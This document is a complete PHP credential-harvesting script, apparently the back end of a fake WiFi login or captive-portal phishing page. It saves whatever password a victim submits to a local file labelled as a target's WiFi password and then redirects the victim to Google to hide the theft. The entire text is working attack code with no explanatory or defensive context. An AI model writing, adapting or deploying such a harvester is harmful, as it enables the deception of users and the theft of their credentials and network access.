<?php

file_put_contents("usernames.txt", "target: WiFi Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.google.com/');
exit();
?>